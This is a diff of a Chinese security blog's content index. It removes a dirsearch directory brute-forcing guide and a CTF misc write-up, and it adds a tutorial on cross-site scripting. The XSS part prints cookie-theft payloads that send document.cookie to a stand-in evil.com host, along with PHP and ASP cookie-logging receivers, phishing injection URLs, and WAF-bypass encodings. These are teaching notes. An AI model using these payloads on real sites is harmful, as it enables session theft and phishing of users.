-<h2 id="暂停扫描"><a href="#暂停扫描" class="headerlink" title="暂停扫描"></a>暂停扫描</h2><p>dirsearch 允许您使用 CTRL+C 暂停扫描进度，从这里，您可以保存进度（稍后继续）、跳过当前目标或跳过当前子目录。</p>
-<p><img src="/2022/dirsearch/pause.png"></p>
-
-
-<h2 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h2><ul>
-<li>通过使用**-r | –recursive**参数，dirsearch 将递归地暴力破解所有目录。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>您可以使用–recursion-depth</strong>设置最大递归深度，使用–recursion <strong>-</strong> status 设置递归状态码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>还有 2 个选项：</p>
-<p><strong>–force-recursive</strong> 和 <strong>–deep-recursive</strong></p>
-<ul>
-<li><strong>强制递归</strong>：暴力递归所有找到的路径，而不仅仅是路径以<code>/</code></li>
-<li><strong>深度递归</strong>：递归暴力破解路径的所有深度（<code>a/b/c</code>&#x3D;&gt; 添加<code>a/</code>，<code>a/b/</code>）</li>
-</ul>
-</li>
-</ul>
-<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程号 ( <strong>-t | –threads</strong> ) 反映了分离的蛮力进程的数量。所以线程数越大，dirsearch 运行得越快。默认情况下，线程数为 30，但如果您想加快进度，可以增加它。</p>
-<p>速度仍然很大程度上取决于服务器的响应时间。如果你的线程过大可能导致Dos</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</span><br></pre></td></tr></table></figure>
-
-<h2 id="前缀-x2F-后缀"><a href="#前缀-x2F-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h2><p>自定义扫描文件前缀或者后缀</p>
-<ul>
-<li><strong>–prefixes</strong>：为所有条目添加自定义前缀</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --prefixes .,admin,_</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tools</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">.tools</span><br><span class="line">admintools</span><br><span class="line">_tools</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–suffixes</strong>：为所有条目添加自定义后缀</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --suffixes ~</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">index.php~</span><br><span class="line">internal~</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>在<code>db/</code>文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中过滤掉它们。</p>
-<p>示例：如果您添加<code>admin.php</code>到<code>db/403_blacklist.txt</code>，每当您执行<code>admin.php</code>返回 403 的扫描时，都会从结果中过滤掉。</p>
-<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>使用**-i | –include-status<strong>和</strong>-x | –exclude-status**选择允许和不允许的响应状态码</p>
-<p>对于更高级的过滤器：</p>
-<ul>
-<li><strong>–exclude-sizes</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-texts</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-regexps</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-redirects</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>-exclude-content</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="原始请求"><a href="#原始请求" class="headerlink" title="原始请求"></a>原始请求</h2><p><strong>dirsearch</strong> 允许您从文件中导入原始请求。内容看起来像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: admin.example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-
-<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>既然扫描网站，我们也可以选择使用 GET 或者 POST 方法</p>
-<p>但是在 post 方法中，POST 是万维网使用的 HTTP 支持的请求方法。POST 请求方法在设计上要求 Web 服务器接受包含在请求消息正文中的数据，最有可能存储它。它通常与 GET HTTP 方法一起使用，该方法在名称或值对中用于将表单数据附加到 URL。如果您使用 GET，则 URL 长度将受到限制。这使用户能够提交书签的结果。</p>
-<p>现在，我们正在使用此命令在 [-m] 参数的帮助下探索另一面。</p>
-<p>正如我们所知，与我们之前执行的 GET 请求方法相比，这些结果是不同且独特的。它显示了一些不同的网页和网页目录。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -m POST</span><br></pre></td></tr></table></figure>
-
-<h2 id="延迟请求"><a href="#延迟请求" class="headerlink" title="延迟请求"></a>延迟请求</h2><p>根据规则，或者限制，延迟自己的请求，免除造成不必要的网络拥堵</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -s 10</span><br></pre></td></tr></table></figure>
-
-<h2 id="词表格式"><a href="#词表格式" class="headerlink" title="词表格式"></a>词表格式</h2><p>支持的词表格式：大写、小写、大写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小写</span><br><span class="line">admin</span><br><span class="line">index.html</span><br><span class="line">大写</span><br><span class="line">ADMIN</span><br><span class="line">INDEX.HTML</span><br><span class="line">首部</span><br><span class="line">Admin</span><br><span class="line">Index.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="排除扩展"><a href="#排除扩展" class="headerlink" title="排除扩展"></a>排除扩展</h2><ul>
-<li>使用**-X | –exclude-extensions**带有扩展名列表将删除单词列表中包含给定扩展名的所有路径</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target -X jsp</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.php</span><br><span class="line">test.jsp</span><br><span class="line"></span><br><span class="line">扫描后：</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如果要排除所有扩展名，除了您在<code>-e</code>标志中选择的扩展名，请使用**–only-selected**</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e html -u https://target --only-selected</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">admin.php</span><br><span class="line">扫描后</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="扫描子目录"><a href="#扫描子目录" class="headerlink" title="扫描子目录"></a>扫描子目录</h2><ul>
-<li><strong>从 URL，您可以使用–subdirs</strong>扫描子目录列表。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>它的反向版本是**–exclude-subdirs**，它可以防止 dirsearch 递归扫描给定的子目录。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/</span><br></pre></td></tr></table></figure>
-
-<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>dirsearch 支持 SOCKS 和 HTTP 代理，有两个选项：代理服务器或代理服务器列表。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p>支持的报告格式：<strong>simple</strong>、<strong>plain</strong>、<strong>json</strong>、<strong>xml</strong>、<strong>md</strong>、<strong>csv</strong>、 <strong>html</strong></p>
-<p>将扫描变成报告输出出来</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --format html -o target.json</span><br></pre></td></tr></table></figure>
-
-<h2 id="没色扫描"><a href="#没色扫描" class="headerlink" title="没色扫描"></a>没色扫描</h2><p>扫描结果是没有颜色的，看个人喜好，毕竟有人喜欢花里胡哨</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ --no-color</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h2><ul>
-<li>服务器有请求限制？这很糟糕，但随意绕过它，通过随机代理<code>--proxy-list</code></li>
-<li>想要找出配置文件或备份？尝试<code>--suffixes ~</code>并<code>--prefixes .</code></li>
-<li>只想查找文件夹&#x2F;目录？为什么不结合<code>--remove-extensions</code>和<code>--suffixes /</code>！</li>
-<li>使用 CIDR 进行暴力破解时，混合使用<code>--cidr</code>、和 将减少大部分噪音 + 假阴性<code>-F``-q</code></li>
-<li>扫描 URL 列表，但不想看到 429 泛滥？<code>--skip-on-status 429</code>将帮助您在返回 429 时跳过目标</li>
-<li>服务器包含会减慢扫描速度的大文件？您<em>可能</em>想使用<code>HEAD</code>HTTP 方法而不是<code>GET</code></li>
-<li>蛮力 CIDR 很慢？可能您忘记减少请求超时和请求重试。建议:<code>--timeout 3 --retries 1</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -823,6 +909,96 @@
 <p><strong>Exp：</strong></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>跨站脚本攻击XSS</title>
+    <url>/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+<span id="more"></span>
+
+<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
+<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
+<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png"></p>
+<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
+<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233924916.png"></p>
+<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
+<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
+<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
+<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
+<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
+<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
+<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
+<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
+<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
+<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
+<ul>
+<li><strong>重定向钓鱼</strong></li>
+</ul>
+<p>将当前访问重定向到一个钓鱼网页</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>HTML注入式钓鱼</strong></li>
+</ul>
+<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>iframe钓鱼</strong></li>
+</ul>
+<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>Flash钓鱼</strong></li>
+</ul>
+<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
+<ul>
+<li><p>高级钓鱼技术</p>
+<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
+</li>
+</ul>
+<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
+<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
+<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
+<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
+<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
+<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
+<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
+<li><strong>HTML实体编码</strong></li>
+</ul>
+<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
+<p>字符编码</p>
+<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
+<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
+<ul>
+<li><strong>URL编码</strong></li>
+</ul>
+<p>两次URL全编码</p>
+<ul>
+<li><strong><code>String.fromCharCode</code>编码</strong></li>
+</ul>
+<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
+<p>XSS绕过也可以看看该文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
+<hr>
+<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
 ]]></content>
       <categories>
         <category>web渗透</category>
@@ -1260,184 +1436,6 @@
       <tags>
         <tag>Hexo</tag>
         <tag>建站</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>每日Misc一</title>
-    <url>/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/</url>
-    <content><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>今日刷题</p>
-<span id="more"></span>
-
-<h2 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h2><p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/attachment-20220323155255-weuysoa.png"></p>
-<p>一张图片</p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
-<li>文件分离</li>
-<li>ELF文件</li>
-</ul>
-<p>命令：file、binwalk、foremost</p>
-<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><p>文件题目是file carving</p>
-<p>第一时间kali查看文件，发现有其他文件，进行文件分离</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323171906-ruminau.png"></p>
-<p>分离文件中有压缩包，解压得到文件</p>
-<p>使用file命令发现是ELF文件，运行得到flag</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323172027-8sps4f5.png"></p>
-<h2 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h2><p>签到题</p>
-<p>下载解压查看</p>
-<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Challenge description:</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">I really hope you are INSAne, but if that&#x27;s not the case </span></span><br><span class="line"><span class="attribute">and that you don&#x27;t want to validate the &quot;INSAnity&quot; challenge </span></span><br><span class="line"><span class="attribute">then maybe you would like to validate this one? </span></span><br><span class="line"><span class="attribute">Here is your flag, you disapointing and boring fellow</span><span class="punctuation">: </span></span><br><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a><strong>知识点</strong></h3><ul>
-<li>Steghide隐写</li>
-<li>png文件头</li>
-<li>unicode编码</li>
-</ul>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>音频隐写的方式，但是没有密码或者Key。文件分离，也没有发现。听，也没有发现什么信息。</p>
-<p>想到<code>Steghide</code>是一个可以将文件隐藏到图片或音频中的工具，使用命令：<code>steghide extract -sf out.wav </code>（无密码）</p>
-<figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="attribute">┌──(root💀kali)-[~/桌面/CTF/MISC]</span></span><br><span class="line"><span class="attribute">└─# steghide extract -sf out.wav </span></span><br><span class="line"><span class="attribute">Enter passphrase</span><span class="punctuation">: </span></span><br><span class="line">wrote extracted data to &quot;download.txt&quot;.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>查看文件得到一个网址：<a href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a></p>
-<p>打开网站。下载得到图片</p>
-<p>图片损坏不能正常显示，用010查看文件，文件头错误 </p>
-<p><code>89 50 4E 47</code></p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174648-aruer40.png"></p>
-<p>打开得到编码</p>
-<p><code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p>
-<p>unicode解码得到</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323174925-skni7fq.png"></p>
-<p>经过尝试，把两个数字相加，出题人鬼才，得到flag{5304}</p>
-<h2 id="BUUCTF-voip"><a href="#BUUCTF-voip" class="headerlink" title="BUUCTF voip"></a>BUUCTF voip</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><ul>
-<li>流量包分析</li>
-<li>voip通话</li>
-</ul>
-<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>打开流量包</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323184625-tpa6e7y.png"></p>
-<p>在voip通话之中有英语听力，flag就在里面。考听力。</p>
-<p> flag{9001IVR}</p>
-<h2 id="BUUCTF-Business-Planning-Group"><a href="#BUUCTF-Business-Planning-Group" class="headerlink" title="BUUCTF Business Planning Group"></a>BUUCTF Business Planning Group</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul>
-<li>BPG图片</li>
-<li>图片隐写</li>
-<li>base64编码</li>
-</ul>
-<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>得到图片</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/challenge-20220323191325-4k6iank.png"></p>
-<p>用binwalk、foremost 也没得到有用的信息。</p>
-<p>在010查看发现文件尾有个BPG</p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323192137-vmw1qbm.png"></p>
-<p><strong>维基百科</strong></p>
-<p><strong>BPG</strong>格式，全称“<strong>Better Portable Graphics</strong>”（更好的便携式图像），它是一个声称比现时最流行的<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>压缩格式更优秀的<a href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%83%8F%E5%8E%8B%E7%BC%A9" title="图像压缩">图像压缩</a>方案，由法国的程序员<a href="https://zh.wikipedia.org/wiki/%E6%B3%95%E5%B8%83%E9%87%8C%E6%96%AF%C2%B7%E8%B4%9D%E6%8B%89" title="法布里斯·贝拉">法布里斯·贝拉</a>（Fabrice Bellard）于2014年创建。他将影像编码格式中的技术运用到了图像编码，以达至更理想的压缩比率，而不同于<a href="https://zh.wikipedia.org/wiki/JPEG" title="JPEG">JPEG</a>为提高压缩比而牺牲画质的方式 ^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-bellard-1">[1]</a>^^<a href="https://zh.wikipedia.org/wiki/BPG#cite_note-techbang-2">[2]</a>^ 。该影像编码格式基于<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E6%95%88%E7%8E%87%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81" title="高效率视频编码">高效率视频编码</a>（HEVC）的<a href="https://zh.wikipedia.org/wiki/%E5%B9%80%E5%85%A7%E7%B7%A8%E7%A2%BC" title="帧内编码">帧内编码</a>技术改良而成。</p>
